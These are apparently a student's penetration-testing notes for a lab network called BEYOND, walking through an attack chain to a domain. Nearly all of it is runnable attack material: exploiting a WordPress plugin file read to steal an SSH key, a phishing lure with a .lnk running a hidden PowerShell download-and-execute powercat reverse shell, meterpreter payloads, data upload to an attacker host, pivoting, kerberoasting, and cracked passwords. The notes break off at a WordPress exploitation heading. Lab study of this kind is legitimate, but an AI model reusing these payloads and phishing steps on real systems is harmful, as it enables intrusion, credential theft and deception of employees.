
# Walkthrough a Real Attack Path

* Prepare for Information Gathering
* Enum the Public Network
* Attack a Public Machine
* Get Access to the Internal Network
* Enum the Internal Network
* Attack an Internal **Web Application**
* Get Access to the Domain Controller

## Prepare for Information Gathering

```shell
mkdir -p walkthru/beyond && cd $_
mkdir -p {mailsrv1,websrv1}/{img,payloads,tools}
touch creds.md
```

## Enum the Public Network

* sudo allows faster scan
* -sC default scriptions
* -sV service enum
* -oN output save

```shell
sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.202.242
```

```shell
25/tcp   open  smtp          hMailServer smtpd
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### OSINT Research for hMailServer

* Search for unknown services or project
* Search for public exploits for code execution
* Use `https://www.cvedetails.com/vulnerability-list/`

HMailServer

* [hmailserver](https://www.hmailserver.com/state) not developed or maintained
* RoundCube and SquirrelMail are popular webmail systems which are often used with hMailServer.

### Enum IIS

* Go to website
* Search for web server dir and files like txt,pdf,config
* Use `gobuster` and `dirb`

```shell
firefox http://192.168.202.242

gobuster dir -u http://192.168.202.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
```

### Enum websrv1

```shell
sudo nmap -sC -sV -oN websrv1/nmap 192.168.202.244
```

```shell
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-generator: WordPress 6.0.2
```

### OSINT OpenSSH 8.9p1 Ubuntu 3

* OpenSSH 8.9p1 Ubuntu 3
* Ubuntu 22.04 (Jammy Jellyfish)

### OSINT Apache

```
CVE-2024-38475
Known exploited
Potential exploit
Improper escaping of output in mod_rewrite in Apache HTTP Server 2.4.59 and earlier allows an attacker to map URLs to filesystem locations that are permitted to be served by the server but are not intentionally/directly reachable by any URL, resulting in code execution or source code disclosure. Substitutions in server context that use a backreferences or variables as the first segment of the substitution are affected.  Some unsafe RewiteRules will be broken by this change and the rewrite flag "UnsafePrefixStat" can be used to opt back in once ensuring the substitution is appropriately constrained.
Source: Apache Software Foundation
```

### Enum Apache

* Get website details 
* Use `whatweb`

```shell
whatweb http://192.168.202.244 | tee websrv1/whatweb
```

```shell
http://192.168.202.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.202.244], RedirectLocation[http://192.168.202.244/main/], UncommonHeaders[x-redirect-by]
http://192.168.202.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.202.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
```

```shell
firefox http://192.168.202.244/main/robots.xml
firefox http://192.168.202.244/main/wp-sitemap.xml

http://192.168.202.244/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=5.6.3
```


### OSINT wordpress 6.0.2

* Use wordpress vuln db `https://wpscan.com/statistics/`
* Use `wpscan`
* --enumerate p(opupular) plugins
* --plugins-detection aggressive

```shell
wpscan --url http://192.168.202.244 --enumerate u,ap,at --plugins-detection aggressive -o websrv1/wpscan
```

```shell
cat websrv1/wpscan
[+] duplicator
 | Location: http://192.168.202.244/wp-content/plugins/duplicator/
 | Last Updated: 2024-08-06T08:03:00.000Z
 | Readme: http://192.168.202.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.10.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.202.244/wp-content/plugins/duplicator/, status: 403
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.202.244/wp-content/plugins/duplicator/readme.txt
```

```shell
searchsploit duplicator
```

 ```shell
 Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read              | php/webapps/50420.py
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit) | php/webapps/49288.rb
```

## Attack a Public Machine

```shell
searchsploit --cve 2021-44228
searchsploit --nmap path/to/nmap-output.xml

searchsploit -x 50420

searchsploit -m 50420
Exploit: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50420
     Path: /usr/share/exploitdb/exploits/php/webapps/50420.py
    Codes: CVE-2020-11738
 Verified: False
File Type: ASCII text
```

```shell
python3 50420.py http://192.168.202.244 /etc/passwd | tee passwd

daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash

python3 50420.py http://192.168.202.244 /home/daniela/.ssh/id_rsa | tee id_rsa_daniela

```shell
chmod 600 id_rsa_daniela
ssh -i id_rsa_daniela daniela@192.168.202.244

The authenticity of host '192.168.202.244 (192.168.202.244)' can't be established.
ED25519 key fingerprint is SHA256:vhxi+CCQgvUHPEgu5nTN85QQZihXqJCE34zq/OU48VM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.202.244' (ED25519) to the list of known hosts.
daniela@192.168.202.244's password: 
```

### Initial Foodhold SSH

* Crack the password for the SSH key
* Use `ssh2john` and `john`

```shell
ssh2john id_rsa_daniela > id_rsa_daniela.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_daniela.hash
tequieromucho (creds/id_rsa_daniela)

echo "user daniela password tequieromucho (creds/id_rsa_daniela)" >> ../creds.md
```

```shell
ssh -i creds/id_rsa_daniela daniela@192.168.202.244
daniela@websrv1:~$

```

### Enum websrv1 with linpeas.sh

* no pivot, no other interfaces or routes found
* mysql on port 3306
* another service on port 33060
* all sudo user can use /usr/bin/git without password
* wordpress db user wordpress password DanielKeyboard3311

```shell
cp /usr/share/peass/linpeas/linpeas.sh . 
python3 -m http.server 80

Interfaces
                                                    
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:9e:04:90 brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.202.244/24 brd 192.168.202.255 scope global ens192
       valid_lft forever preferred_lft forever

Active Ports (ss)                                                                                                        
tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*                                                                
tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      511                *:80               *:*          
tcp   LISTEN 0      128             [::]:22            [::]:*       

https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                              
Matching Defaults entries for daniela on websrv1:                                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git

Analyzing Github Files (limit 70)

drwxr----- 8 root root 4096 Oct  4  2022 /srv/www/wordpress/.git


Last time logon each user
Username         Port     From             Latest                                                                            
root             tty1                      Fri Mar 10 10:15:55 +0000 2023
offsec           pts/0    192.168.118.2    Thu Oct 13 13:35:31 +0000 2022
daniela          pts/1    192.168.45.174   Mon Nov 24 07:48:36 +0000 2025
marcus           pts/0    192.168.118.4    Wed Sep 28 10:05:38 +0000 2022

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27  2022 /srv/www/wordpress/wp-config.php                                            
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );

-rwsr-xr-x 1 root root 227K Feb 14  2022 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable

Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                       
# file: /home//offsec                                                                                                        
USER   offsec    rwx     
user   offsec    r-x     
GROUP  offsec    r-x     
mask             r-x     
other            r--     

```

Three potential privilege escalation vectors:

* Abuse sudo command **/usr/bin/git**
* Use sudo to search the Git repository
* Attempt to access other users with the WordPress database password

### Privilege escalation

* Use `https://gtfobins.github.io/` to bypass local security description
* Use `sudo git` for privilege escalation
* Search `git log` for credentials

```shell
# use help and less for pro
git branch --help config
!/bin/sh

id root
uid=0(root) gid=0(root) groups=0(root)
```

```shell
sudo git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644
index 25667c7..0000000
--- a/fetch_current.sh
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-# Script to obtain the current state of the web app from the staging server
-
-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
```

## Get Access to the Internal Network

Findings

* no local admin on mailsrv1, but password is correct
* Option 1: no shares with extra permissions
* Option 2: send mail with malicious attachment to other users

```shell
cat users.txt                            
daniela
john
marcus  

cat passwords.txt
tequieromucho
DanielKeyboard3311
dqsTwTpZPn#nL    
```

### Get Domain credentials

```shell
# verify password
nxc smb 192.168.202.242 -u ./usernames.txt  -p ./passwords.txt --continue-on-success \
| tee mailsrv1/nxc

SMB                      192.168.202.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 

# list shares
nxc smb 192.168.202.242 -u "john"  -p "dqsTwTpZPn#nL" --shares 

SMB         192.168.202.242 445    MAILSRV1         Share           Permissions     Remark
SMB         192.168.202.242 445    MAILSRV1         -----           -----------     ------
SMB         192.168.202.242 445    MAILSRV1         ADMIN$                          Remote Admin
SMB         192.168.202.242 445    MAILSRV1         C$                              Default share
SMB         192.168.202.242 445    MAILSRV1         IPC$            READ            Remote IPC
```

### Phishing Access

* Option 1: create a word with macros
* Option 2: create a webdav config.Library-ms pointing to .lnk and powershell reverse shell

Staged-Attack:

* Foothold - Create a Windows library `config.Library-ms` for our victim
* Victim receives a .Library-ms file, double-click looks like folder structure
* Attack - Create a .LNK file served by WebDAV server that executes a Reverse Shell
* Victim executes the malicious .LNK file

Prepare webdav with config.Library-ms pointing to .lnk via http 

```shell
cat << 'EOF' > config.Library-ms

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<!-- We can use @shell32.dll,-34575 or @windows.storage.dll,-34582 as specified on the Microsoft website. Choose the latter because shell32.dll looks to suspecious-->
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<!-- Navigation bar and Icon. We can use imagesres.dll to choose between all Windows icons.  
<iconReference>imageres.dll,-1002</iconReference> Documents folder icon.
<iconReference>imageres.dll,-1003</iconReference> Pictures folder icon. 
-->
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<!-- Document Folder Type
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> Documents or
<folderType>{B3690E58-E961-423B-B687-386EBFD83239}</folderType> Pictures
-->
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<!--
Attention: 
The URL is important part and it must be set once per execution.
After execution the file gets manipulated by Windows.
-->
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.174</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>

</libraryDescription>

EOF

mkdir webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root $(pwd)/webdav/
...
12:02:05.403 - INFO    : Serving on http://0.0.0.0:80 
```

Prepare .lnk with hidden powercat reverse shell using Windows

```shell
xfreerdp3 +clipboard /cert:ignore /u:offsec /v:192.168.202.250 /p:'lab'

# create .lnk with
powershell.exe -WindowStyle hidden -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.174:8080/powercat.ps1');powercat -c 192.168.45.174 -p 4444 -ep"

```

Prepare TCP listener for powershell reserve shell

```shell
nc -nlvp 4444
```

Test .lnk first by double click and then Upload to WebDAV

| ![WebDav Upload](./walkthru/walkthru/beyond/img/serve-lnk-reverse-powershell.png) |
| :---: |
| *Server powercat reverse shell via webdav* |

Prepare pre-text email with 

```shell
cat << 'EOF' > mailsrv1/email.txt
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

Send Phishing Mails

* Send email.txt with attached config.Library-ms
* To daniela and marcus
* From `john@beyond.com`
* Use ``swaks`
* --supress-data to summarize SMTP transaction
* -ap enables password auth

```shell
cd mailsrv1

sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.202.242 --body @email.txt --header "Subject: Staging Script" --suppress-data -ap
```

```
nc -lnvp 4444               
listening on [any] 4444 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.202.242] 62550

whoami
hostname
CLIENTWK1

ipconfig
IPv4 Address. . . . . . . . . . . : 172.16.158.243
```

## Enum the Internal Network

Findings

* NetNTLMv2 for user marcus
* Sheduled App C:\Users\marcus\Documents\exec.ps1 for privilege escalation

Attacker

```shell
cp /usr/share/peass/winpeas/winPEASx64.exe http/winpeas.exe
python3 -m http.server 8080 -d http 
```

Victim

```shell
# marcus
systeminfo

route print
===========================================================================
Interface List
  9...00 50 56 9e 55 25 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0   172.16.158.254   172.16.158.243     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     172.16.158.0    255.255.255.0         On-link    172.16.158.243    271
   172.16.158.243  255.255.255.255         On-link    172.16.158.243    271
   172.16.158.255  255.255.255.255         On-link    172.16.158.243    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    172.16.158.243    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    172.16.158.243    271

Host Name:                 CLIENTWK1
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
```

### Enum clientsk1 with winpeas.exe

```powershell
iwr -uri http://192.168.45.174:8080/winpeas.exe -out winpeas.exe 
./winpeas.exe

RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    1         Console        marcus         BEYOND                   Active    


UAC Status
? If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss                       
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.   

  Version: NetNTLMv2
  Hash:    marcus::BEYOND:1122334455667788:6b5fe3dff295c8f97fe8884f55eb69b5:010100000000000047dc32673b5ddc01f71b596c0419f114000000000800300030000000000000000000000000200000da286902f89271c2874a190a2ece3799df6589118d9d53c444362b383cdb5b410a00100000000000000000000000000000000000090000000000000000000000 

Network Ifaces and known hosts
? The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:9E:55:25]: 172.16.158.243 / 255.255.255.0
        Gateways: 172.16.158.254
        DNSs: 172.16.158.240
        Known hosts:
          172.16.158.240        00-50-56-9E-4C-63     Dynamic
          172.16.158.254        00-50-56-9E-3B-0D     Dynamic
          172.16.158.255        FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static

DNS cached
dcsrv1.beyond.com                     DCSRV1.beyond.com                     172.16.158.240
mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.158.254


Current TCP Listening Ports

TCP        172.16.158.243        57410         192.168.45.174        4444            Established       2392            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  TCP        172.16.158.243        57483         172.16.158.240        445             Established       4               System

Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html                                                             
    (BEYOND\marcus) exec_lnk: powershell -ep bypass -File C:\Users\marcus\Documents\exec.ps1

File: C:\Program Files (x86)\Microsoft\Edge\Application\109.0.1518.61\Installer\setup.exe --configure-user-settings --verbose-logging --system-level --msedge --channel=stable (Unquoted and Space detected) - C:\

Checking write permissions in PATH folders (DLL Hijacking)
C:\Windows\System32\OpenSSH\

 Handle: 1096(file)
    Handle Owner: Pid is 7732(winpeas) with owner: marcus
    Reason: AllAccess
    File Path: \Windows\System32\en-US\crypt32.dll.mui
    File Owner: NT SERVICE\TrustedInstaller


Computer Name           :   CLIENTWK1
   User Name               :   offsec
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   
   Last Logon              :   11/24/2025 1:07:55 AM
   Logons Count            :   39
   Password Last Set       :   10/13/2022 4:19:29 AM


Cloud Information
Learn and practice cloud hacking in training.hacktricks.xyz
AWS EC2?                                No   
Azure VM?                               No   
Azure Tokens?                           Yes

Looking for Kerberos tickets
?  https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html
    serverName: krbtgt/BEYOND.COM
    RealmName: BEYOND.COM
    StartTime: 11/24/2025 4:09:24 AM
    EndTime: 11/24/2025 1:57:40 PM
    RenewTime: 12/1/2025 3:57:40 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, renewable, forwarded, forwardable
   =================================================================================================

    serverName: krbtgt/BEYOND.COM
    RealmName: BEYOND.COM
    StartTime: 11/24/2025 3:57:40 AM
    EndTime: 11/24/2025 1:57:40 PM
    RenewTime: 12/1/2025 3:57:40 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, initial, renewable, forwardable
   =================================================================================================

    serverName: ldap/DCSRV1.beyond.com
    RealmName: BEYOND.COM
    StartTime: 11/24/2025 4:09:24 AM
    EndTime: 11/24/2025 1:57:40 PM
    RenewTime: 12/1/2025 3:57:40 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================

    serverName: cifs/DCSRV1.beyond.com
    RealmName: BEYOND.COM
    StartTime: 11/24/2025 4:09:24 AM
    EndTime: 11/24/2025 1:57:40 PM
    RenewTime: 12/1/2025 3:57:40 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
   =================================================================================================

Checking KrbRelayUp
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup
  The system is inside a domain (BEYOND) so it could be vulnerable.

Enumerating Security Packages Credentials
C:\Users\marcus\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt

PS history file: C:\Users\marcus\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```shell
cat computers.txt                                        
172.16.6.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.6.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.50.242)

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```

### Enum AD with sharphound.ps1

Findings

* beccy@beyond.com is domain admin
* computer `internalsrv1@beyond.com` has ip 172.16.158.241
* marked clientwk1, marcus, daniela, john as owned
* local administrator has a session on internalsrv1 indicated by 500
* `beccy@beyond.com` has session on `mailsrv1.beyond.com`
* `daniela@beyond.com` has a kerberoastable account with accees to service principle name `http/internalsrv1.beyond.com`

No more results from pre-build queries

* Find Workstations where Domain Users can RDP
* Find Servers where Domain Users can RDP
* Find Computers where Domain Users are Local Admin
* Shortest Path to Domain Admins from Owned Principals

```shell
find /opt -type f -name SharpHound.ps1
cp tools/SharpHound.ps1 http/.
```

```powershell
iwr -uri http://192.168.45.174:8080/SharpHound.ps1 -out SharpHound.ps1

Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethods All -OutputDirectory "$env:USERPROFILE" -OutputPrefix "beyond_audit"
```

Exfiltrate the file using powershell

```powershell
$response=(New-Object Net.WebClient).UploadFile('http://192.168.45.174/psupload.php', './beyond_audit_20251124081529_BloodHound.zip'); [Text.Encoding]::UTF8.GetString($response)
```

Search for Domain User that are local Admins on the computers

```shell
unzip beyond_audit_20251124081529_BloodHound.zip -d bloodhound
jq '                                    
  .data
  | map({ (.ObjectIdentifier): .Properties.name })
  | add
' bloodhound/beyond_audit_20251124070656_users.json > bloodhound/sid_to_name.json

jq --slurpfile sidmap bloodhound/sid_to_name.json ' 
  .data[]
  | {
      ComputerName: .Properties.name,
      DomainLocalAdmins: [.LocalAdmins.Results[]?.ObjectIdentifier 
      | select($sidmap[0][.])    
      | {SID: ., Username: $sidmap[0][.]}]
    }                                           
' bloodhound/beyond_audit_20251124070656_computers.json
{
  "ComputerName": "MAILSRV1.BEYOND.COM",
  "DomainLocalAdmins": []
}
{
  "ComputerName": "CLIENTWK1.BEYOND.COM",
  "DomainLocalAdmins": []
}
{
  "ComputerName": "INTERNALSRV1.BEYOND.COM",
  "DomainLocalAdmins": []
}
{
  "ComputerName": "DCSRV1.BEYOND.COM",
  "DomainLocalAdmins": [
    {
      "SID": "S-1-5-21-1104084343-2915547075-2081307249-500",
      "Username": "ADMINISTRATOR@BEYOND.COM"
    }
  ]
}

```shell
sudo neo4j restart
/opt/BloodHound-linux-arm64/BloodHound
```

```plain
# list computers
# list users
# list groups 
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m
MATCH (m:Group) RETURN m

# custom relationshtip queries 
# (NODES)-[:RELATIONSHIP]->(NODES)

# query active sessions
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

```plain
Select computer mailsrv1
Run -> List all Kerberoastable Accounts

daniela@beyond.com
```

### Enum AD with NMap via socks 5 proxy

* requirement a meterpreter tcp reverse shell on port 443
* Use `multi/manage/autoroute` autoroute for meterpreter session
* Use `multi/manage/autoroute` socks 5 proxy (slow)
* Use `chisel` and [download for target os](https://github.com/jpillora/chisel/releases/tag/v1.7.7)


```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.174 LPORT=443 -f exe -o http/met.exe

sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.174
set LPORT 443
set ExitOnSession false
run -j
```

```powershell
iwr -uri http://192.168.45.174:8080/met.exe -out met.exe
./met.exe
```

```shell
[*] Sending stage (203846 bytes) to 192.168.202.242

sessions
Active sessions
===============

  Id  Name  Type                     Information                Connection
  --  ----  ----                     -----------                ----------
  1         meterpreter x64/windows  BEYOND\marcus @ CLIENTWK1  192.168.45.174:443 -> 192.168.202.242:62317 (192.168.202.242)

# use autoroute feature for session 1
use multi/manage/autoroute
set session 1
run

route 

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.158.0       255.255.255.0      Session 1

# use socks 5 proxy on meterpreter session
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j

[*] Starting the SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload                              Payload opts
  --  ----                           -------                              ------------
  0   Exploit: multi/handler         windows/x64/meterpreter/reverse_tcp  tcp://192.168.45.174:443
  1   Auxiliary: server/socks_proxy

```

```shell
tail -n 5 /etc/proxychains.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080

# run nmap on internal network servers
sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.158.240 172.16.158.241 172.16.158.254

Nmap scan report for 172.16.158.241
Host is up (0.20s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp open   https

Nmap scan report for 172.16.158.254
Host is up (0.40s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp closed https


# run nxc smb --shares on internal network servers
proxychains -q nxc smb 172.16.158.240-241 172.16.158.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares

firefox --preferences # proxy socks 5
firefox http://172.16.158.241/wordpress/
```

Run chisel instead of socks 5 proxy

```shell
# socks 5 is slow use chisel
# Download https://github.com/jpillora/chisel/releases/tag/v1.7.7
session -i 1
upload chisel.exe C:\\Users\\marcus\\chisel.exe
^Z

chmod a+x ./chisel
./chisel server -p 8443 --reverse

firefox localhost:80
```

```shell
# route internalsrv1 port 80 via 8443 
./chisel.exe client 192.168.45.174:8443 R:80:172.16.158.241:80 &


firefox http://internalsrv1.beyond.com/wordpress/wp-admin/
```

## Attack the Internal Web Application

* Daniela is vulnerable to kerberoasting
* Require: john user 
* Got Wordpress access with user daniela

### Perform Kerberoasting and crack hash

```shell
proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.158.240 beyond.com/john
password: ****

hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --show

$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$8b19d026672a7a5aa25f473b6790c298$cbacacc6e4282bf87ae465a6e35c433e46dc09cc45744869ca5044a1ba7a24d7c9c439029fdc354a025987e26dddac148e4de3448b59b5d01066fa67fa96881ec978c7aaeeba2543c6beba0f471b4ed60220c1d0e8853412b41dd24b3d3811bd068c0a15c8d8249de6f677c238f09eba8bcab9c0b6f0e007ebe68ff1ac7e410b4fb1037235689163ad4582a0f353a0f90e4b335f605c18acede514da5857368ed9b0f30c2b32ab724dde540a809add3d159a0565c668fa107c6fb75d6f4966c15c54428fcd4110763962d4bca6ec9fb6bf35a25e966cd684bfb882b0bb14d07f4f7b02a7f12fab9c0090ccf9c5d4a476a95ac1a1bda814daa59dbcdd4385c1408e5478d2acaabc15f9f9aa41ce2b23e0015c065730a97b462d97223e2136c0e0eafca7573981a4724b4d4fb0ffe2cc7204689cfbf0ae1fc5757673401d035fe73a5408bac782d70da889f25fc8084f8d06291f532ad9011f295deb7c62789f8291e67ed388320e331d061567d23bf4c3f98e78b0c9d3a44b49038b07c6534b2ab341ba2fe575eae6b7fe601145afdfba924905e24421a26365ad38258938d634cba0b6ab33616138a695a451c1c8a09749f689b3ca271fcadbc7904fa033f620a18bbba1af49acd4d54ea6a1dedb59e9105cc7e8bad142ddbcb15d28f716b6a23b53e35bce8c78888e8efbbc9bb2d146438d81631f7301d8f13719a77a7837b836aadbb46444d52d12a39bdc6dd7778c6d7cecbe36e9db13e08a069a75a846c8e0d8b05d3797799d39cfce492867e1f026e999ed7017a6ec6bdaefd24cf5e4aedce2eaca57f82dc1dc2998e7150ba0d5f3e17a637bc38714c43b9dc976344db57958649ad7f19dc6b106dff522a8d0b9c2d4fdb294ea5a86497a78bb3a4b7beac55735fde4febfee3e93200f4420fff7f5b37b6ca80619ed81f4a4a62c93f47c506e6e10a090229f4a3057228403802f4aa1d540dc616d7e38e940e1c0f40a9ab771101ee7a850157bb06ce41b9baa5b10d3a1b4cde4327013dc9d0a60b2845df63b350d665649761b39ca5a49914edc52fcd12f7cc1e1498b4eb7919805728401609ecbca1cf9aa92700b670eae38d3139d8c671c6410cff198343ca8b55483a68d63dfe96d2438f28c9db0c575adf045b8512a316aaf15f19b2831564a1703511771dd97fc45a9089cd627ef0a7ab324dff9f0896301d94063565897e97fb77a9ce646dfcebdb0fbdbbb9108f97018066089a8b72b92cb0b554410be3b273acff6fe9f7b43f25192b377d5b78355aa6df9b2090e057b56d56f5b22f38a3632dc01e8f5683403d9923846ed2748b80a07f438fe4219c03635bf342e474363:DANIelaRO123
```

### Exploit Wordpress plugin

* Search for active or available plugins
